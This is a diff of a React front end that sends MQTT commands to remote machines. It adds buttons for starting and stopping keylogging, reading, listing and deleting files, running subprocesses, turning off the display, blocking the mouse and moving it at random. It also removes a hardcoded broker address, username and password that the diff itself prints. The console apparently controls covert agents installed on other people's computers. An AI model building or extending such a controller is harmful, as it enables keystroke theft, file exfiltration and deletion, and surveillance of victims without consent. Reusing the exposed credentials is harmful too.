@@ -17,14 +17,14 @@ export default function App() {
 
   const [panel,setPanel] = useState(true)
 
-  const BROKER = "wss://n171f1d9.ala.eu-central-1.emqxsl.com:8084/mqtt";
+  const BROKER = import.meta.env.VITE_EMQX_BROKER
 
   // MQTT connection
   useEffect(() => {
     const options = {
-      username: "aryanvish2006",
-      password: "aryanvish2006saniya",
-      reconnectPeriod: 2000,
+      username: import.meta.env.VITE_EMQX_USERNAME,
+      password: import.meta.env.VITE_EMQX_PASSWORD,
+      reconnectPeriod: 2000,  
       clean: true,
     };
 
@@ -36,7 +36,6 @@ export default function App() {
       mqttClient.subscribe("heartbeat/+"); // heartbeat subscription
       mqttClient.subscribe("ack/+"); // ack subscription
       mqttClient.subscribe("control/broadcast"); // broadcast support
-      mqttClient.subscribe("trace/+");
       setLog(prev => [...prev, "Connected to MQTT broker"]);
     });
 
@@ -142,6 +141,15 @@ export default function App() {
         <button style={{ backgroundColor: "#2980b9" }} onClick={() => sendCommand("desktop", false)}>Show Desktop</button>
         <button style={{ backgroundColor: "#8e44ad" }} onClick={() => sendCommand("close", false)}>Close Window</button>
         <button style={{ backgroundColor: "#f1c40f" }} onClick={() => sendCommand("screenshot", false)}>Screenshot</button>
+        <button style={{ backgroundColor: "#f1160fff" }} onClick={() => sendCommand("startkeylog", false)}>Start KeyLog</button>
+        <button style={{ backgroundColor: "#38f10fff" }} onClick={() => sendCommand("stopkeylog", false)}>Stop KeyLog</button>
+        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`playtone 2500 500`, false)}>Beep</button>
+        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`playtone ${inputValue}`, true)}>Play Tone</button>
+        <button style={{ backgroundColor: "#6dca34ff" }} onClick={() => sendCommand("displayoff", false)}>Display Off</button>
+        <button style={{ backgroundColor: "#9c15eaff" }} onClick={() => sendCommand("displayon", false)}>Display On</button>
+        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`listfolder ${inputValue}`, true)}>List Folder</button>
+        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`readfile ${inputValue}`, true)}>Read File</button>
+        <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`deletefile ${inputValue}`, true)}>Delete File</button>
         <button style={{ backgroundColor: "#7f8c8d" }} onClick={() => sendCommand("end", false)}>End Script</button>
       </div>
 
@@ -153,12 +161,17 @@ export default function App() {
         <button style={{ backgroundColor: "#c0392b" }} onClick={() => sendCommand("blockmouse", false)}>Block Mouse</button>
         <button style={{ backgroundColor: "#27ae60" }} onClick={() => sendCommand("unblock", false)}>Unblock All</button>
         <button style={{ backgroundColor: "#e84393" }} onClick={() => sendCommand(`notepadtype${heartEffect ? "heart" : ""} ${inputValue}`, true)}>Notepad Type</button>
+        <button style={{ backgroundColor: "#ae274fff" }} onClick={() => sendCommand("drawheart", false)}>Draw Heart</button>
         <button style={{ backgroundColor: "#d35400" }} onClick={() => sendCommand(`alertprompt ${inputValue}`, true)}>Alert Prompt</button>
         <button style={{ backgroundColor: "#e67e22" }} onClick={() => sendCommand(`inputprompt ${inputValue}`, true)}>Input Prompt</button>
         <button style={{ backgroundColor: "#16a085" }} onClick={() => sendCommand(`type ${inputValue}`, true)}>Type</button>
         <button style={{ backgroundColor: "#3498db" }} onClick={() => sendCommand(`press ${inputValue}`, true)}>Press Key</button>
         <button style={{ backgroundColor: "#2ecc71" }} onClick={() => sendCommand(`backspace ${inputValue}`, true)}>Backspace</button>
         <button style={{ backgroundColor: "#9b59b6" }} onClick={() => sendCommand(`remap ${inputValue}`, true)}>Remap Key</button>
+          <button style={{ backgroundColor: "#2ecc71" }} onClick={() => sendCommand(`keydown ${inputValue}`, true)}>KeyDown</button>
+        <button style={{ backgroundColor: "#9b59b6" }} onClick={() => sendCommand(`keyup ${inputValue}`, true)}>KeyUp</button>
+        <button style={{ backgroundColor: "#59a0b6ff" }} onClick={() => sendCommand(`startrandommove`, false)}>Start Random Mouse</button>
+        <button style={{ backgroundColor: "#59a0b6ff" }} onClick={() => sendCommand(`stoprandommove`, false)}>Stop Random Mouse</button>
         <button style={{ backgroundColor: "#8e44ad" }} onClick={() => sendCommand(`swapkey ${inputValue}`, true)}>Swap Key</button>
         <button style={{ backgroundColor: "#9b59b6" }} onClick={() => sendCommand(`browser ${inputValue}`, true)}>Open Browser</button>
         <button style={{ backgroundColor: "#34495e" }} onClick={() => sendCommand(`subprocess ${inputValue}`, true)}>Run Subprocess</button>
@@ -176,9 +189,13 @@ export default function App() {
       </div>
 </div>:<div><Keyboard sendCommand={sendCommand} />
 <MouseTouchpad/></div>}
+<button style={{backgroundColor:"#2bc535ff",marginLeft:10,border:"2px solid white"}} onClick={() => {
+  setLog([])
+}}>Clear Log</button>
       <div className="logs">
+        
         <h3>Logs</h3>
-        {log.map((l, i) => (<div key={i}>{l}</div>))}
+        {log.map((l, i) => (<div style={{marginBottom:5}} key={i}>{l}</div>))}
       </div>
     </div>
   );
